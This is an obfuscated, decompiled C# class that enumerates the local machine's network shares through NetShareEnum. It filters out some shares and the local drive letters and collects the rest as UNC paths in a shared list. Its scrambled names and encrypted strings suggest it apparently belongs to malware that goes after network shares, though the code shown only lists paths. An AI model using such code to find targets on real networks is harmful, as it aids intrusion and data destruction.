using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jtAYXTgtXeY;

public sealed class bUjGxVuvXRxv
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct tbEiXqtpLeoaG
	{
		public string KyiFJXkyYxMLlfp;

		public uint iPnnGEuyISPC;

		public string HzLDcrCcHgaI;

		public tbEiXqtpLeoaG(string string_0, uint uint_0, string string_1)
		{
			KyiFJXkyYxMLlfp = string_0;
			iPnnGEuyISPC = uint_0;
			HzLDcrCcHgaI = string_1;
		}

		public override string ToString()
		{
			return KyiFJXkyYxMLlfp;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public tbEiXqtpLeoaG[] CtTtJJbtHyqMgbc(string string_0)
	{
		List<tbEiXqtpLeoaG> list = new List<tbEiXqtpLeoaG>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(tbEiXqtpLeoaG));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				tbEiXqtpLeoaG item = (tbEiXqtpLeoaG)Marshal.PtrToStructure(ptr, typeof(tbEiXqtpLeoaG));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new tbEiXqtpLeoaG(getString_0(107397841) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void EsjcKotcDRB()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			tbEiXqtpLeoaG[] array = new bUjGxVuvXRxv().CtTtJJbtHyqMgbc(Environment.MachineName);
			tbEiXqtpLeoaG[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				tbEiXqtpLeoaG tbEiXqtpLeoaG = array2[i];
				if (tbEiXqtpLeoaG.ToString().Contains(getString_0(107397864)) || tbEiXqtpLeoaG.ToString().Contains(getString_0(107397855)) || tbEiXqtpLeoaG.ToString().Contains(getString_0(107397814)) || tbEiXqtpLeoaG.ToString().Contains(getString_0(107387258)) || logicalDrives.Contains(tbEiXqtpLeoaG.ToString().Replace(getString_0(107402854), getString_0(107397805))))
				{
					continue;
				}
				if (!efoRmwagKuQD.khKeiHllADXOQ.Contains(getString_0(107387277) + Environment.MachineName + getString_0(107397382) + tbEiXqtpLeoaG))
				{
					efoRmwagKuQD.khKeiHllADXOQ.Add(getString_0(107387277) + Environment.MachineName + getString_0(107397382) + tbEiXqtpLeoaG);
				}
				if (efoRmwagKuQD.vktNUmAHjywZJ)
				{
					try
					{
						Console.WriteLine(getString_0(107397832), getString_0(107387277) + Environment.MachineName + getString_0(107397382) + tbEiXqtpLeoaG);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (efoRmwagKuQD.WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(efoRmwagKuQD.PhOHjwgFpwoPkI, getString_0(107397775) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static bUjGxVuvXRxv()
	{
		Strings.CreateGetStringDelegate(typeof(bUjGxVuvXRxv));
	}
}
